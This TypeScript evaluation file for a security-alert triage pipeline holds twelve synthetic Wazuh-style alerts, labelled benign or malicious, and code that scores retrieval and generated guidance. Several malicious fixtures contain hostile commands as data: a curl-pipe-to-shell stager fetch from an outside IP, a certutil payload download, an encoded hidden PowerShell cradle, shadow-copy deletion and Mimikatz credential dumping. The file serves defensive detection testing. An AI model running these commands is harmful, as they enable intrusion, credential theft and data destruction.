import type {
  CanonicalAlert,
  EvalModelRun,
  EvalScenario,
  RetrievedChunk,
} from "../src/types.ts";
import { kbManager } from "./kb.ts";
import { generateGuidance, refineAlert } from "./pipeline.ts";
import { runTriageAssessment } from "./triage.ts";

export const SAMPLE_EVAL_SCENARIOS: EvalScenario[] = [
  // 4 Benign Scenarios
  {
    id: "EVAL-01",
    name: "Routine Nightly Backup",
    label: "benign",
    expected_mitre: null,
    reference_text:
      "Verified scheduled nightly tar/rsync backup job executed by backup service account to authorized NAS destination during maintenance window. No unauthorized changes or containment required.",
    alert: {
      id: "eval-01",
      timestamp: "2025-02-14T02:00:05Z",
      rule_id: "550",
      rule_level: 3,
      rule_description: "Scheduled nightly backup archive completed by backup-svc",
      agent_name: "db-prod-01",
      agent_ip: "10.20.2.10",
      source_ip: "10.20.2.10",
      dest_ip: "10.20.99.5",
      user: "backup-svc",
      process: "/usr/bin/rsync",
      command: "rsync -az /var/backups/nightly.tar.gz backup-svc@10.20.99.5:/nas/db/",
      file_path: "/var/backups/nightly.tar.gz",
      mitre_ids: [],
      mitre_tactics: [],
      compliance_tags: [],
      raw_text:
        "2025-02-14T02:00:05Z db-prod-01 (10.20.2.10) rule 550 level 3: Scheduled nightly backup archive completed by backup-svc rsync -az /var/backups/nightly.tar.gz backup-svc@10.20.99.5:/nas/db/",
      source_type: "wazuh_json",
    },
  },
  {
    id: "EVAL-02",
    name: "Admin SSH Login from Allowlisted Bastion IP",
    label: "benign",
    expected_mitre: null,
    reference_text:
      "Authorized SSH publickey login by sysadmin from known corporate bastion IP during normal operations. Confirm against change ticket or maintenance schedule if needed.",
    alert: {
      id: "eval-02",
      timestamp: "2025-02-14T10:15:22Z",
      rule_id: "5715",
      rule_level: 3,
      rule_description: "sshd: authentication success via publickey from allowlisted bastion",
      agent_name: "web-prod-02",
      agent_ip: "10.20.1.22",
      source_ip: "10.10.0.5",
      dest_ip: "10.20.1.22",
      user: "ops_admin",
      process: "sshd",
      command: null,
      file_path: null,
      mitre_ids: [],
      mitre_tactics: [],
      compliance_tags: [],
      raw_text:
        "2025-02-14T10:15:22Z web-prod-02 (10.20.1.22) rule 5715 level 3: sshd: authentication success via publickey for ops_admin from allowlisted bastion 10.10.0.5",
      source_type: "wazuh_json",
    },
  },
  {
    id: "EVAL-03",
    name: "Routine Scheduled Maintenance Task",
    label: "benign",
    expected_mitre: null,
    reference_text:
      "Standard OS log-rotation and WSUS/apt update scheduled maintenance task executed by SYSTEM/root. Verify task hash and signature match baseline.",
    alert: {
      id: "eval-03",
      timestamp: "2025-02-14T03:30:00Z",
      rule_id: "60103",
      rule_level: 3,
      rule_description: "Windows Task Scheduler ran signed Microsoft Defender signature update task",
      agent_name: "win-app-04",
      agent_ip: "10.20.3.14",
      source_ip: null,
      dest_ip: null,
      user: "SYSTEM",
      process: "MpCmdRun.exe",
      command: '"C:\\Program Files\\Windows Defender\\MpCmdRun.exe" -SignatureUpdate',
      file_path: "C:\\Program Files\\Windows Defender\\MpCmdRun.exe",
      mitre_ids: [],
      mitre_tactics: [],
      compliance_tags: [],
      raw_text:
        '2025-02-14T03:30:00Z win-app-04 rule 60103 level 3: Windows Task Scheduler ran signed Microsoft Defender signature update task MpCmdRun.exe -SignatureUpdate as SYSTEM',
      source_type: "wazuh_json",
    },
  },
  {
    id: "EVAL-04",
    name: "Authorized Internal Vulnerability Scanner",
    label: "benign",
    expected_mitre: null,
    reference_text:
      "Expected port and web probe traffic from authorized internal vulnerability scanner during scheduled scan window. Confirm scanner IP and scan schedule.",
    alert: {
      id: "eval-04",
      timestamp: "2025-02-14T01:10:11Z",
      rule_id: "31101",
      rule_level: 3,
      rule_description: "Authorized internal Nessus vulnerability scanner HTTP probe",
      agent_name: "nginx-gw-01",
      agent_ip: "10.20.1.5",
      source_ip: "10.20.50.100",
      dest_ip: "10.20.1.5",
      user: null,
      process: "nginx",
      command: null,
      file_path: null,
      mitre_ids: [],
      mitre_tactics: [],
      compliance_tags: [],
      raw_text:
        "2025-02-14T01:10:11Z nginx-gw-01 (10.20.1.5) rule 31101 level 3: Authorized internal Nessus vulnerability scanner HTTP probe from 10.20.50.100 User-Agent Nessus",
      source_type: "wazuh_json",
    },
  },

  // 8 Malicious Scenarios
  {
    id: "EVAL-05",
    name: "External SSH Brute Force",
    label: "malicious",
    expected_mitre: "T1110.001",
    reference_text:
      "Multiple failed SSH login attempts from external IP targeting root/admin accounts (T1110.001). Check for any subsequent successful authentication, block external source IP at firewall/active-response with analyst approval, and enforce key-based auth.",
    alert: {
      id: "eval-05",
      timestamp: "2025-02-14T14:22:09Z",
      rule_id: "5720",
      rule_level: 10,
      rule_description: "sshd: Multiple authentication failures from external source IP",
      agent_name: "bastion-ext-01",
      agent_ip: "10.20.0.10",
      source_ip: "198.51.100.77",
      dest_ip: "10.20.0.10",
      user: "root",
      process: "sshd",
      command: null,
      file_path: null,
      mitre_ids: ["T1110.001"],
      mitre_tactics: ["Credential Access"],
      compliance_tags: ["PCI-DSS:11.4"],
      raw_text:
        "2025-02-14T14:22:09Z bastion-ext-01 (10.20.0.10) rule 5720 level 10: sshd: Multiple authentication failures for user root from 198.51.100.77 MITRE T1110.001",
      source_type: "wazuh_json",
    },
  },
  {
    id: "EVAL-06",
    name: "Mimikatz LSASS Credential Dumping",
    label: "malicious",
    expected_mitre: "T1003.001",
    reference_text:
      "Process accessed lsass.exe memory consistent with Mimikatz credential dumping (T1003.001). Immediately isolate host with analyst approval, assume cached credentials are compromised, and reset exposed domain/local passwords.",
    alert: {
      id: "eval-06",
      timestamp: "2025-02-14T15:05:31Z",
      rule_id: "92213",
      rule_level: 14,
      rule_description: "Sysmon Event 10: Suspicious ProcessAccess to lsass.exe memory (Mimikatz pattern)",
      agent_name: "fin-wkst-09",
      agent_ip: "10.20.4.39",
      source_ip: null,
      dest_ip: null,
      user: "CORP\\jdoe",
      process: "C:\\Users\\jdoe\\AppData\\Local\\Temp\\m64.exe",
      command: "m64.exe sekurlsa::logonpasswords",
      file_path: "C:\\Windows\\System32\\lsass.exe",
      mitre_ids: ["T1003.001"],
      mitre_tactics: ["Credential Access"],
      compliance_tags: ["NIST-800-53:AC-6"],
      raw_text:
        "2025-02-14T15:05:31Z fin-wkst-09 rule 92213 level 14: Sysmon Event 10 ProcessAccess to lsass.exe by C:\\Users\\jdoe\\AppData\\Local\\Temp\\m64.exe sekurlsa::logonpasswords user CORP\\jdoe MITRE T1003.001",
      source_type: "wazuh_json",
    },
  },
  {
    id: "EVAL-07",
    name: "Webshell Command Execution via Web Server",
    label: "malicious",
    expected_mitre: "T1059.004",
    reference_text:
      "Web server worker process (www-data/nginx) spawned an interactive Unix shell executing reconnaissance and curl download (webshell activity). Isolate web host with analyst approval, inspect webroot for newly dropped PHP/JSP shells, and kill child processes.",
    alert: {
      id: "eval-07",
      timestamp: "2025-02-14T16:12:48Z",
      rule_id: "80792",
      rule_level: 12,
      rule_description: "Web server spawned /bin/sh webshell executing reconnaissance and remote payload fetch",
      agent_name: "web-dmz-03",
      agent_ip: "10.20.1.33",
      source_ip: "203.0.113.88",
      dest_ip: "10.20.1.33",
      user: "www-data",
      process: "/bin/sh",
      command: "/bin/sh -c id; uname -a; curl -s http://203.0.113.88/stager.sh | sh",
      file_path: "/var/www/html/uploads/cmd.php",
      mitre_ids: ["T1059.004"],
      mitre_tactics: ["Execution"],
      compliance_tags: [],
      raw_text:
        "2025-02-14T16:12:48Z web-dmz-03 rule 80792 level 12: Webshell activity www-data spawned /bin/sh -c id; uname -a; curl -s http://203.0.113.88/stager.sh | sh at /var/www/html/uploads/cmd.php MITRE T1059.004",
      source_type: "wazuh_json",
    },
  },
  {
    id: "EVAL-08",
    name: "Ransomware Shadow Copy Deletion & Mass Encryption",
    label: "malicious",
    expected_mitre: "T1486",
    reference_text:
      "Rapid file encryption burst and Volume Shadow Copy deletion detected (T1486). Immediately isolate affected host from network and SMB shares with analyst approval, disable active account, and validate offline backups.",
    alert: {
      id: "eval-08",
      timestamp: "2025-02-14T17:40:12Z",
      rule_id: "92650",
      rule_level: 15,
      rule_description: "Ransomware behavior: vssadmin shadow copy deletion and mass .locked file renames",
      agent_name: "filesrv-01",
      agent_ip: "10.20.5.11",
      source_ip: null,
      dest_ip: null,
      user: "svc_file",
      process: "vssadmin.exe",
      command: "vssadmin.exe delete shadows /all /quiet",
      file_path: "D:\\Shares\\Finance\\Q4_Report.xlsx.locked",
      mitre_ids: ["T1486"],
      mitre_tactics: ["Impact"],
      compliance_tags: [],
      raw_text:
        "2025-02-14T17:40:12Z filesrv-01 rule 92650 level 15: Ransomware behavior vssadmin.exe delete shadows /all /quiet and mass file encryption D:\\Shares\\Finance\\Q4_Report.xlsx.locked user svc_file MITRE T1486",
      source_type: "wazuh_json",
    },
  },
  {
    id: "EVAL-09",
    name: "Unauthorized Windows Service Privilege Escalation",
    label: "malicious",
    expected_mitre: "T1543.003",
    reference_text:
      "Suspicious Windows service installed with binary running from Temp directory under SYSTEM context (T1543.003). Isolate host, stop and remove unauthorized service after artifact capture with analyst approval.",
    alert: {
      id: "eval-09",
      timestamp: "2025-02-14T18:05:19Z",
      rule_id: "60145",
      rule_level: 11,
      rule_description: "Windows Event 7045: New service created pointing to binary in Temp directory",
      agent_name: "app-win-02",
      agent_ip: "10.20.3.20",
      source_ip: null,
      dest_ip: null,
      user: "local_admin",
      process: "sc.exe",
      command: "sc create SysHelper binPath= C:\\Windows\\Temp\\svchost_upd.exe start= auto",
      file_path: "C:\\Windows\\Temp\\svchost_upd.exe",
      mitre_ids: ["T1543.003"],
      mitre_tactics: ["Persistence", "Privilege Escalation"],
      compliance_tags: [],
      raw_text:
        "2025-02-14T18:05:19Z app-win-02 rule 60145 level 11: Windows Event 7045 service SysHelper created by local_admin sc create SysHelper binPath= C:\\Windows\\Temp\\svchost_upd.exe MITRE T1543.003",
      source_type: "wazuh_json",
    },
  },
  {
    id: "EVAL-10",
    name: "Phishing-Linked Office Macro Spawning cmd.exe",
    label: "malicious",
    expected_mitre: "T1059.003",
    reference_text:
      "Microsoft Word spawned cmd.exe to execute a remote payload drop (T1059.003). Quarantine workstation with analyst approval, inspect email attachment origin, and terminate child processes.",
    alert: {
      id: "eval-10",
      timestamp: "2025-02-14T19:14:02Z",
      rule_id: "92052",
      rule_level: 12,
      rule_description: "WINWORD.EXE spawned suspicious cmd.exe command shell",
      agent_name: "hr-laptop-17",
      agent_ip: "10.20.6.44",
      source_ip: null,
      dest_ip: "198.51.100.205",
      user: "CORP\\asmith",
      process: "cmd.exe",
      command: "cmd.exe /c certutil -urlcache -split -f http://198.51.100.205/inv.exe %TEMP%\\inv.exe",
      file_path: "C:\\Users\\asmith\\Downloads\\Invoice_2025.docm",
      mitre_ids: ["T1059.003"],
      mitre_tactics: ["Execution"],
      compliance_tags: [],
      raw_text:
        "2025-02-14T19:14:02Z hr-laptop-17 rule 92052 level 12: WINWORD.EXE spawned cmd.exe /c certutil -urlcache -split -f http://198.51.100.205/inv.exe %TEMP%\\inv.exe user CORP\\asmith MITRE T1059.003",
      source_type: "wazuh_json",
    },
  },
  {
    id: "EVAL-11",
    name: "Encoded PowerShell Download Cradle",
    label: "malicious",
    expected_mitre: "T1059.001",
    reference_text:
      "PowerShell executed with -EncodedCommand and hidden window flags (T1059.001). Decode Base64 payload, inspect Event ID 4104 script blocks, and isolate endpoint with analyst approval if C2 activity is confirmed.",
    alert: {
      id: "eval-11",
      timestamp: "2025-02-14T20:33:50Z",
      rule_id: "91815",
      rule_level: 12,
      rule_description: "Suspicious PowerShell execution with -EncodedCommand and ExecutionPolicy Bypass",
      agent_name: "eng-wkst-05",
      agent_ip: "10.20.4.18",
      source_ip: null,
      dest_ip: "203.0.113.55",
      user: "CORP\\mlee",
      process: "powershell.exe",
      command: "powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
      file_path: null,
      mitre_ids: ["T1059.001"],
      mitre_tactics: ["Execution"],
      compliance_tags: [],
      raw_text:
        "2025-02-14T20:33:50Z eng-wkst-05 rule 91815 level 12: powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -EncodedCommand user CORP\\mlee MITRE T1059.001",
      source_type: "wazuh_json",
    },
  },
  {
    id: "EVAL-12",
    name: "Off-Hours Valid Account Compromise Anomaly",
    label: "malicious",
    expected_mitre: "T1078",
    reference_text:
      "Successful login using valid privileged account from anomalous external IP immediately following failed login attempts (T1078). Disable account, revoke active tokens/sessions, and reset password with analyst approval.",
    alert: {
      id: "eval-12",
      timestamp: "2025-02-14T23:51:10Z",
      rule_id: "60122",
      rule_level: 11,
      rule_description: "Anomalous successful privileged account logon from external IP outside business hours",
      agent_name: "dc-core-01",
      agent_ip: "10.20.0.5",
      source_ip: "198.51.100.144",
      dest_ip: "10.20.0.5",
      user: "CORP\\adm_backup",
      process: "lsass.exe",
      command: null,
      file_path: null,
      mitre_ids: ["T1078"],
      mitre_tactics: ["Initial Access", "Persistence"],
      compliance_tags: [],
      raw_text:
        "2025-02-14T23:51:10Z dc-core-01 rule 60122 level 11: Anomalous successful logon for privileged account CORP\\adm_backup from external IP 198.51.100.144 MITRE T1078",
      source_type: "wazuh_json",
    },
  },
];

function computeRetrievalMetrics(
  retrievedChunks: RetrievedChunk[],
  expectedMitre: string | null
): { precision_at_3: number | null; recall_at_3: number | null } {
  if (!expectedMitre || !expectedMitre.trim()) {
    return { precision_at_3: null, recall_at_3: null };
  }
  const expectedIds = expectedMitre
    .split(/[,;|]/)
    .map((s) => s.trim().toUpperCase())
    .filter(Boolean);
  if (expectedIds.length === 0) {
    return { precision_at_3: null, recall_at_3: null };
  }

  const top3 = retrievedChunks.slice(0, 3);
  let relevantInTop3 = 0;
  const matchedExpected = new Set<string>();

  for (const chunk of top3) {
    const cid = (chunk.technique_id ?? "").toUpperCase();
    const recUpper = chunk.record_id.toUpperCase();
    for (const exp of expectedIds) {
      const expParent = exp.split(".")[0];
      if (
        cid === exp ||
        cid === expParent ||
        recUpper.includes(exp)
      ) {
        relevantInTop3 += 1;
        matchedExpected.add(exp);
        break;
      }
    }
  }

  const denom = Math.min(3, Math.max(top3.length, 1));
  const precision_at_3 = Number((relevantInTop3 / denom).toFixed(4));
  const recall_at_3 = Number(
    (matchedExpected.size / expectedIds.length).toFixed(4)
  );
  return { precision_at_3, recall_at_3 };
}

export async function runSingleEvalModel(params: {
  scenario: EvalScenario;
  modelChoice: "A" | "B";
  threshold: number;
}): Promise<EvalModelRun> {
  const start = Date.now();
  try {
    let workingAlert: CanonicalAlert = params.scenario.alert;
    let eventSummary =
      workingAlert.rule_description ||
      workingAlert.raw_text.slice(0, 160);

    // Run Refine when unstructured text without rule_description
    if (workingAlert.source_type === "text" && !workingAlert.rule_description) {
      const refined = await refineAlert(workingAlert);
      workingAlert = refined.alert;
      eventSummary = refined.event_summary;
    }

    const retrieval = await kbManager.retrieve({
      eventSummary,
      ruleDescription: workingAlert.rule_description,
      mitreIds: workingAlert.mitre_ids,
      threshold: params.threshold,
    });

    const triage = await runTriageAssessment({
      alert: workingAlert,
      eventSummary,
      retrievedChunks: retrieval.chunks,
      lowConfidence: retrieval.low_confidence,
      modelChoice: params.modelChoice,
    });

    const generated = await generateGuidance({
      alert: workingAlert,
      eventSummary,
      retrievedChunks: retrieval.chunks,
      lowConfidence: retrieval.low_confidence,
      modelChoice: params.modelChoice,
    });

    const { precision_at_3, recall_at_3 } = computeRetrievalMetrics(
      retrieval.chunks,
      params.scenario.expected_mitre
    );

    let response_similarity: number | null = null;
    if (params.scenario.reference_text.trim()) {
      response_similarity = await kbManager.computeTextSimilarity(
        generated.guidance,
        params.scenario.reference_text
      );
    }

    const flagged =
      triage.verdict === "needs_review" ||
      triage.verdict === "likely_malicious";

    return {
      model_choice: params.modelChoice,
      model_used: generated.modelUsed,
      verdict: triage.verdict,
      confidence: triage.confidence,
      flagged,
      precision_at_3,
      recall_at_3,
      response_similarity,
      guidance: generated.guidance,
      ms: Date.now() - start,
    };
  } catch (err) {
    return {
      model_choice: params.modelChoice,
      model_used: "",
      verdict: "needs_review",
      confidence: 0,
      flagged: true,
      precision_at_3: null,
      recall_at_3: null,
      response_similarity: null,
      guidance: "",
      ms: Date.now() - start,
      error: err instanceof Error ? err.message : String(err),
    };
  }
}
